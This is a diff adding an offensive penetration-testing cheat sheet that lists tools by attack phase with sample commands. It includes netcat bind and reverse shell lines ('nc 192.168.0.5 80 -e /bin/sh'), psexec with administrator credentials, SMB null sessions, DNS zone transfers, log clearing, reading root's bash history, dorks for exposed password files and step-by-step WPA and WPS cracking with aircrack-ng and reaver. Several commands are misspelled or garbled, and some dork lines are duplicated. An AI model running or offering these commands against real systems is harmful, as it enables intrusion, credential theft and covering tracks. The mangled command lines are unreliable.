@@ -1,0 +1,349 @@
+RECONNAISSANCE
+    Yougetsignsl.com - Reverse ip domain check
+    Whois
+    Icann.org & Iana.org &  Arin
+    Dnsmap & dnsenum
+    Dnsstuff
+    theharvester
+    Smart whois
+    NeoTrace, VisualRoute, and VisualLookout
+    github/blackfan - php dumper.php
+    dig
+    nslookup
+
+    Tips and tricks
+        filetype:ini wcx_ftp
+        dig @192.168.1.3 version.bind chaos txt
+        dig -t axfr xakep.ru @ns.gameland.ru
+        Nslookup set type=any ; ls -d example.com. >\> /tmp/zone_out
+        Traceroute traceroute -S -p53 10.10.10.
+        Ip lookup arin.net
+        Nslookup ls -d
+
+
+        A (address) — Maps a host name to an IP address
+        SOA (Start of Authority) — Identifies the DNS server responsible for the domain information
+        CNAME (canonical name) — Provides additional names or aliases for the address record
+        MX (mail exchange) — Identifies the mail server for the domain
+        SRV (service) — Identifies services such as directory services
+        PTR (pointer) — Maps IP addresses to host names
+        NS (name server) — Identifies other name servers for the domain
+
+
+SCAN
+    nmap & zenmap & zmap
+    Strobe
+    Udp_scan
+    Superscan
+    hping & hping3 & nping
+    Icmpquery & icmppush
+    ncat
+    SolarWinds Toolset, Queso, Harris Stat, and Cheops
+
+    Tips and trics
+        Ncat nc -v -z -w2 192.168.1.1 1-140
+        Tcp connected scan (syn, syn/ack, ack)
+        tcp syn (ack, rst)
+        tcp fin, xmas tree, null (rst)
+        Tcp ack (fw map - statefull or stateless)
+
+
+IPSEC
+    filetype:pcf
+    ./ike-scan vpn.elec0ne.com
+    nmap -sU -p 500
+    ikeprobe.exe vpn.elec0ne.com
+
+SIP
+    SiVus
+    svmap.py
+    svwar.py
+    ₽sipscan
+    Sipsac
+    Inviteflood
+
+ENUMERATION
+    Port grabbing
+    dns dig
+    nslookup
+    finger
+    openssl
+    Dirb
+    Telnet server 80/23/25
+    Tftp tcp/udp 69
+    Getmac
+    Userinfo
+    Snmputil
+    IP Network Browser
+
+    Tips and tricks
+        Nc -nvv -o output.txt server 80 < nudge.txt
+        Nudge.txt get / http/1.0
+        Dns dig @192.168.234.110 example2.org axfr
+        Nslookup server; ls -d servername
+        finger –l @target.example.com finger 0@ip
+        openssl s_client –quiet -connect www.example.com:443
+
+    NETBIOS
+        nbstat
+        net view
+        net use
+        DumpSec
+        ShareEnum
+        req query
+        enum, developed by Razor Team from BindView
+        NBTEnum
+        Wininfo
+        SMBBF
+        Getacct
+        snscan
+        showmount
+        Smbrelay & smbproxy
+        Smb auditing tool
+        Unix rpc
+        Rwho &resers
+        Hyena
+
+    Tips and tricks
+        net view /domain & net view /domain:corleone
+        nbtstat -A 192.168.202.33 & nbtscan 192.168.234.0/24
+        net use \\192.168.202.33\IPC$ "" /u:»"  null session (tcp 139/445)
+        net use \\192.21.7.1 \IPC$ "" /u: ""
+        net view \\vito
+        reg query \\10.219.1.207\HKLM\SOFTWARE\MICROSOFT\ Windows\CurrentVersion\Run
+
+LOGGING
+    logparser
+    event log parser for windows
+    logstash
+    fluentd
+    splunk (online)
+    Clean log -elsave
+    Auditpol
+    Elsave
+    Windows event viewer
+
+FORENSIC
+    ntfswalk & gena
+    who /var/log/wtmp
+    cat /root/.bash_history
+
+    Tips and tricks
+        find / -type f -perm -04000 –ls
+        The following command will find all SGID files: find / -type f -perm -02000 -ls
+        find / -perm –2 –type f –print
+        tail -f /var/log/messages
+
+BRUTEFORCE
+    hydra
+    Brutors
+    John the ripper
+    Hcat
+    Pwdump & pwdump2-3-6
+    Ophcrack & ntbf
+    Lsadump2
+    Legion
+    NTInfoScan
+    L0phtCrack
+    Kerbcrack
+
+DOS
+    hping & hping3 & nping
+    Mausezahn mz packet generator
+    Ping of death
+    Land attack
+    Ssping
+    Winnuke
+    Jolt2
+    Bubonic
+    Rpc locator
+    Trinoo
+    Shaft
+    Tribal flood network - tfn, tfn2k
+    Mstream
+
+HIJACKING SESSION
+    Hunt
+    Juggernaut
+
+NETWORK
+    Loki
+    Yersinia
+    Scapy
+    Rprobe
+    Srip
+    Thc-ipv6
+    P0f
+    Cisco-torch
+    Enabler
+    Cisco-auditing-tool
+    Snort
+    Windump
+    Iris
+    Mac changer
+    Smac
+    Sterm
+    Ip restrictions scanner
+    Arpspoof, dnsspoof
+    Macof
+    Dsniff
+    Etherflood
+    fragrouter
+
+    Tips and tricks
+        fragrouter –B1
+        Kernel-level IP forwarding: vi /proc/sys/net/ipv4/ip_forward (change 0 to 1)
+
+WEB
+    Whatweb
+    Dirb
+    Burp suite
+    W3af
+    Dirbuster
+    Owas-zap
+    Fiddler
+    Nikto
+    Nessus
+    Xenotics
+    Webscarab
+    Hp webinspect
+    Css
+    Sql injection
+    Http splitting
+    Csrf
+
+    Tips and tricks
+        Index of /admin”
+        “Index of /password”
+        “Index of /mail”
+        “Index of /” +banques +filetype:xls (for France)
+        “Index of /” +passwd
+        “Index of /” password.txt
+        Index of /admin”
+        “Index of /password”
+        “Index of /mail”
+        “Index of /” +banques +filetype:xls (for France)
+        “Index of /” +passwd
+        “Index of /” password.txt
+        inurl:exchange inurl:finduser inurl:root
+        type=hidden name=price
+
+METADATA
+    Metagoofil
+    Exiftool
+
+SPOOF
+    cain
+    Dsniff
+    Arpredirect
+    Webmitm
+    Dnsspoof
+    Webspy
+    Ettercap
+    Solarwind ip network browser
+    Arpspoof
+    Intercepter
+
+    Tips and tricks
+        FRagrouter - b1
+        ./cdp -i eth0 -n 10000 -l 1480 -r
+        cdp -v -i eth0 -m 1 -D 'Hacker' -P 'Ethernet0' -C RI -L 'Intel' -S "'uname -a?" -F '255.255.255.255'
+
+MAC OVERFLOW
+    macof
+
+SHELL
+    Reverse meterpreter
+    ncat
+    Hxdef
+
+    Tips and tricks
+        C:\TEMP\NC11Windows>nc –L –d –e cmd.exe –p 8080
+
+Reverse shell
+    icmpsh
+    nc
+    psexec
+    vnc & winvnc
+    007 shell
+    icmp shell
+    ackcmd
+
+    Tips and tricks
+        attacker nc -p 80 -L or nc -p 80 -l or nc -p 80 -s 192.168.0.5 -l
+        victim nc 192.168.0.5 80 -e /bin/sh or cmd.execmpsh
+        psexec \\server-name-or-ip -u admin_username -p admin_password command Here’s an example of a typical command:
+        C:\>psexec \\10.1.1.1 -u Administrator -p password -s cmd.exe
+
+
+PORT REDIRECTION
+    Fpipe
+
+HIDDENING FILES
+    Attrib +h directory
+
+SQL
+    sqlmap
+    Sql power injector
+    Sqlninja
+
+WIFI
+    aurodump-ng
+    aircrack-ng
+    aireplay-ng
+    Kismet
+    horst
+    Pyrit, cowpatty
+    Reawer-wps, wpscrack, bully, pixie-wps, wpspin.sh
+    Wifite
+    Karma, mana, hostapd-wpe
+    Wps-scripts, wifi-arsenal on github
+
+    Tips and tricks
+        airmon-ng start wifi0 9
+        airodump-ng --write savefile ath0
+        aireplay-ng --arpreplay -b 00:11:24:A4:44:AF -h 00:1E:C2:B7:95:D9 ath0
+        aircrack-ng -z -b 00:11:24:A4:44:AF savefile.cap
+        airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0
+        aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0
+        aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
+
+        airodump-ng –c [channel] –bssid [bssid] –w /root/Desktop/ [monitor interface]
+        aireplay-NG -0 2 -a [BSSID рутера] -с [клиент BSSID] mon0
+        Aircrack-NG-a2 -b [BSSID рутера] -w [путь к словарю или к Wordlist] /root/Desktop/*.cap
+
+        reawer -i mon0 -c 1 -b mac -vv -S
+        pixiewps -e -a -S
+        reawer -i mon0 -c 1 -b mac -vv -S --pin=pin
+        reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -K 1 -vv
+
+        iw reg set BZ
+        ifconfig wlan0 hw ether aa:bb:cc:dd:ee
+        macchanger -r wlan0
+        macchanger -m aa:bb:cc:dd:ee wlan0
+        iwconfig wlan0 txpower 30
+        airmon-ng -wps
+        USB = USB method, ETHER = Ethernet, LAB = Label, DISP = Display, EXTNFC = External NFC, INTNFC = Internal NFC, NFCINTF = NFC Interface, PBC = Push
+        Button
+        airodump-ng –wps –uptime wlan0mon
+
+
+NET MONITORS
+    Tcpview
+    Fports
+    Pentestbox
+    Prcview
+
+SCANNERS
+    Tenable nesus
+    Qualys
+    Skybox
+    Rapid7 nexpose
+    Core impact
+    iis internet scanner
+    X-scan
+    Sara (security audit research assistant)
+    Sara (security audit research assistant)
+    Redseal
+    Algosec
+
